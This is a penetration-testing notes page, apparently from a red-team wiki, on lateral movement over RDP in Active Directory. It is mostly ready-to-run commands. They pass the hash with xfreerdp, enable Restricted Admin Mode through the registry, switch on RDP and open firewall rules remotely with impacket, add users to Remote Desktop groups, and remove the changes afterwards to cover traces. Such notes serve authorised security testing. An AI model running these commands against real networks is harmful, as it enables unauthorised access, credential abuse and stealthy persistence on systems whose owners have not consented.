---
title: RDP Lateral Movement
---

[[notes/lateral-movement/index]] over [[notes/network/rdp]].

Connect over RDP.

=== "[[notes/tools/freerdp]]"
    ~~~ bash
    xfreerdp /cert:ignore +clipboard /dynamic-resolution /tls-seclevel:0 /u:john.doe@corp.local /p:'passw0rd' /v:srv01.corp.local
    ~~~

=== "builtin"
    ~~~ bat
    mstsc.exe /v:srv01.corp.local
    ~~~

> **Note:** RDP works over Chisels SOCKS proxy, but not over Sliver.

References:

- [How Authentication Works when you use Remote Desktop](http://web.archive.org/web/20230928175714/https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop), including Remote Credential Guard and PKU2U

Other tools:

- [evilrdp](https://github.com/skelsec/evilrdp)

Untested tools:

- [IronRDP](https://github.com/Devolutions/IronRDP), in Rust

# Pass the Hash

[[notes/ad/pass-the-hash]] to RDP does not work by default because RDP requires interactive logon.
However it is possible to switch RDP to network logon by enabling *Restricted Admin Mode*.
Unfortunately this introduces the infamous [[notes/ad/double-hop-problem]].
It can be configured by setting the [[notes/windows/registry]] value `HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin` to `0`.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-reg -k -no-pass srv01.corp.local add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v DisableRestrictedAdmin -vt REG_DWORD -vd 0
    ~~~

=== "PowerShell"
    ~~~ powershell
    New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\LSA' -Name DisableRestrictedAdmin -Value 0
    ~~~

=== "builtin"
    ~~~ bat
    reg.exe add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
    ~~~

Authenticate with a NT hash.

=== "[[notes/tools/freerdp]]"
    ~~~ bash
    xfreerdp /cert:ignore +clipboard /dynamic-resolution /tls-seclevel:0 /u:jdoe@corp.local /pth:$nthash /v:srv01.corp.local
    ~~~

Cleanup.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-reg -k -no-pass srv01.corp.local delete -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v DisableRestrictedAdmin
    ~~~

=== "PowerShell"
    ~~~ powershell
    Remove-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\LSA' -Name DisableRestrictedAdmin
    ~~~

=== "builtin"
    ~~~ bat
    reg.exe delete /f "\\srv01.corp.local\HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
    ~~~

# Kerberos Authentication

Authenticate over Kerberos.

=== "[[notes/tools/aardwolfgui]]"
    ~~~ bash
    aardpclient 'rdp+kerberos-password://corp\jdoe:passw0rd@srv01.corp.local/?dc=dc01.corp.local'
    ~~~

Kerberos support in `rdesktop` seems to be incomplete.
`crackmapexec` should support it, but currently throws an exception.
`aardwolf` does support it, but doesn't implement dynamic resolution and shared folders yet.

[[notes/ad/pass-the-ticket]] to RDP works only if *Remote Credential Guard* is enabled, because otherwise it requires an interactive logon.

References:

- [twitter.com/Defte_/status/1707370420515553356](https://twitter.com/Defte_/status/1707370420515553356), recompile [[notes/tools/freerdp]] with `WITH_GSSAP` for Kerberos support
- [Abusing RDPs Remote Credential Guard with Rubeus PTT](http://web.archive.org/web/20230216004623/https://www.pentestpartners.com/security-blog/abusing-rdps-remote-credential-guard-with-rubeus-ptt/)

# Certificated-based Authentication

a) With PKINIT ([source](https://mobile.twitter.com/an0n_r0/status/1560699394365673472))

- install `pcsd`
- install [vpcd](https://frankmorgner.github.io/vsmartcard/virtualsmartcard/README.html) as virtual smartcard reader
- install [OpenSC](https://github.com/OpenSC/OpenSC/wiki/Smart-Card-Simulation#simulating-piv) as virtual smartcard
- upload your certificate into the virtual smartcard with [yubico-piv-tool](https://developers.yubico.com/yubico-piv-tool/)
- run `xfreerdp /smartcard`

b) [[notes/ad/unpac-the-hash]]

Maybe you need to disable the smart card requirement first by setting the [[notes/windows/registry]] key `HKLM\Software\Microsoft\Windows\CurrentVersion\policies\System\scforceoption` to `0`.

# Enable RDP

Enable RDP by setting the [[notes/windows/registry]] value `HKLM\System\CurrentControlSet\Control\Terminal Server\fDenyTSConnections` to `0` and open the firewall.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-reg -k -no-pass srv01.corp.local add -keyName 'HKLM\System\CurrentControlSet\Control\Terminal Server' -v fDenyTSConnections -vt REG_DWORD -vd 0
    impacket-wmiexec -k -no-pass -nooutput srv01.corp.local 'netsh advfirewall firewall set rule group="remote desktop" new enable=yes'
    ~~~

=== "PowerShell"
    ~~~ powershell
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name fDenyTSConnections -Value 0
    Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'
    Get-Service termservice
    ~~~

=== "builtin"
    ~~~ bat
    reg.exe add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
    netsh.exe advfirewall firewall set rule group="remote desktop" new enable=yes
    sc.exe query termservice
    ~~~

Cleanup.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-reg -k -no-pass srv01.corp.local delete -keyName 'HKLM\System\CurrentControlSet\Control\Terminal Server' -v fDenyTSConnections
    ~~~

=== "PowerShell"
    ~~~ powershell
    Remove-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections
    ~~~

=== "builtin"
    ~~~ bat
    reg.exe delete /f "\HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
    ~~~

Allow an unprivileged user to login over RDP.

~~~ bat
net.exe localgroup "Remote Desktop Users" jdoe /add
net.exe localgroup Remotedesktopbenutzer jdoe /add
~~~
